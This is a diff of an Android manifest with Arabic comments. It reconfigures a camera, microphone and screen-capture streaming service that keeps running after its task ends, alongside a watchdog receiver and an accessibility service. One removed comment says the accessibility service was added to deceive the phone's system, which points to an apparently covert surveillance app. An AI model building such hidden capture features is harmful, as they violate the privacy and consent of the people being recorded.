@@ -100,12 +100,11 @@
             android:name=".StreamWatchdogReceiver"
             android:exported="false" />
 
-        <!-- ✅ إضافة: خدمة الكاميرا في عملية معزولة (:remote) -->
+        <!-- ✅ تم إزالة android:process=":remote" لمنع تعارض العمليتين -->
         <service
             android:name=".StreamForegroundService"
             android:exported="false"
             android:stopWithTask="false"
-            android:process=":remote" 
             android:foregroundServiceType="camera|microphone|mediaProjection|dataSync"/>
 
         <service
@@ -116,7 +115,6 @@
             </intent-filter>
         </service>
 
-        <!-- ✅ إضافة: خدمة الوصول (Accessibility Service) لخداع نظام الهاتف -->
         <service
             android:name=".CameraAccessibilityService"
             android:exported="false"
@@ -140,18 +138,6 @@
         <meta-data
             android:name="com.google.firebase.messaging.default_notification_icon"
             android:resource="@mipmap/ic_launcher" />
-
-    <service
-            android:name=".CameraAccessibilityService"
-            android:exported="false"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
 
     </application>
 
